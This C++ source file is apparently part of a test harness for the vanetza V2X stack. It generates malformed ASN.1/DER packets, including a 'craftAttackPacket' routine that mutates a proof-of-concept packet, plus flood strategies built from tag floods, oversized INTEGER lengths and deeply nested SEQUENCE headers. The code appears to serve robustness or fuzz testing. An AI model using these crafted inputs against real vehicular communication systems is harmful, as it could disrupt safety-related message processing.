#include "qos_harness/traffic_generator.hpp"
#include <cstdlib>
#include <algorithm>

namespace qos_harness {

vanetza::ByteBuffer TrafficGenerator::craftAttackPacket(const vanetza::ByteBuffer& poc_packet, unsigned int seed) {
    vanetza::ByteBuffer attack = poc_packet;
    srand(seed);

    if (attack.size() <= 64) return attack;

    const uint8_t flood_candidates[] = {0x02, 0x01, 0x03, 0x04};
    uint8_t flood_byte = flood_candidates[rand() % 4];

    int variation = (rand() % 41) - 20; // -20 to +20
    size_t flood_end = attack.size() + variation;

    if (flood_end > attack.size()) {
        attack.resize(flood_end, flood_byte);
    }

    for (size_t i = 64; i < std::min(flood_end, attack.size()); ++i) {
        attack[i] = flood_byte;
    }

    return attack;
}

vanetza::ByteBuffer TrafficGenerator::floodFlat02(size_t n) { return vanetza::ByteBuffer(n, 0x02); }
vanetza::ByteBuffer TrafficGenerator::floodFlat03(size_t n) { return vanetza::ByteBuffer(n, 0x03); }
vanetza::ByteBuffer TrafficGenerator::floodFlat04(size_t n) { return vanetza::ByteBuffer(n, 0x04); }

vanetza::ByteBuffer TrafficGenerator::floodValidIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    for (size_t i = 0; i + 2 < n; i += 3) {
        buf[i]   = 0x02;
        buf[i+1] = 0x01;
        buf[i+2] = 0x00;
    }
    return buf;
}

vanetza::ByteBuffer TrafficGenerator::floodLargeIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x02);
    size_t i = 0;
    while (i + 4 <= n) {
        size_t content = std::min(n - i - 4, static_cast<size_t>(0x3FF));
        buf[i]   = 0x02;
        buf[i+1] = 0x82;
        buf[i+2] = static_cast<uint8_t>((content >> 8) & 0xFF);
        buf[i+3] = static_cast<uint8_t>( content       & 0xFF);
        i += 4 + content;
    }
    return buf;
}

vanetza::ByteBuffer TrafficGenerator::floodSequenceOfIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    if (n < 4) return buf;
    size_t content_len = n - 4;
    buf[0] = 0x30;
    buf[1] = 0x82;
    buf[2] = static_cast<uint8_t>((content_len >> 8) & 0xFF);
    buf[3] = static_cast<uint8_t>( content_len       & 0xFF);
    for (size_t i = 4; i + 2 < n; i += 3) {
        buf[i]   = 0x02;
        buf[i+1] = 0x01;
        buf[i+2] = 0x00;
    }
    return buf;
}

vanetza::ByteBuffer TrafficGenerator::floodDeepNested(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    size_t offset = 0;
    while (offset + 4 <= n) {
        size_t remaining = n - offset - 4;
        buf[offset]   = 0x30;
        buf[offset+1] = 0x82;
        buf[offset+2] = static_cast<uint8_t>((remaining >> 8) & 0xFF);
        buf[offset+3] = static_cast<uint8_t>( remaining       & 0xFF);
        offset += 4;
    }
    return buf;
}

std::vector<std::pair<std::string, FloodStrategy>> TrafficGenerator::makeStrategies() {
    return {
        { "flat-0x02 (INTEGER tags)",          floodFlat02            },
        { "flat-0x03 (BIT STRING tags)",       floodFlat03            },
        { "flat-0x04 (OCTET STRING tags)",     floodFlat04            },
        { "valid INTEGER triples 02 01 00",    floodValidIntegers     },
        { "large INTEGER 02 82 xx xx",         floodLargeIntegers     },
        { "SEQUENCE of INTEGER triples",       floodSequenceOfIntegers},
        { "deep nested SEQUENCE headers",      floodDeepNested        },
    };
}

} // namespace qos_harness